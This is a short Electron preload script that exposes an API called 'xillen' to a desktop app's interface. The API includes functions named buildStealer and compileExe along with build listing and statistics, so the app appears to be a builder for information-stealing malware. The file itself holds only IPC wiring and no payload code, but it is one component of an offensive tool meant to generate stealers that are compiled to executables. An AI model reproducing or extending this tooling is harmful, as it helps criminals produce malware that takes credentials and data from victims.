const { contextBridge, ipcRenderer, clipboard } = require('electron')

contextBridge.exposeInMainWorld('xillen', {
  checkPassword: (password) => ipcRenderer.invoke('check-password', password),
  buildStealer: (config) => ipcRenderer.invoke('build-stealer', config),
  compileExe: (pyPath, name) => ipcRenderer.invoke('compile-exe', pyPath, name),
  getBuilds: () => ipcRenderer.invoke('get-builds'),
  getStats: () => ipcRenderer.invoke('get-stats'),
  openBuildsFolder: () => ipcRenderer.invoke('open-builds-folder'),
  setOpacity: (opacity) => ipcRenderer.invoke('set-opacity', opacity),
  pickFolder: () => ipcRenderer.invoke('pick-folder'),
  copyToClipboard: (text) => clipboard.writeText(text || ''),
  onCompileLog: (callback) => ipcRenderer.on('compile-log', (event, data) => callback(data))
})
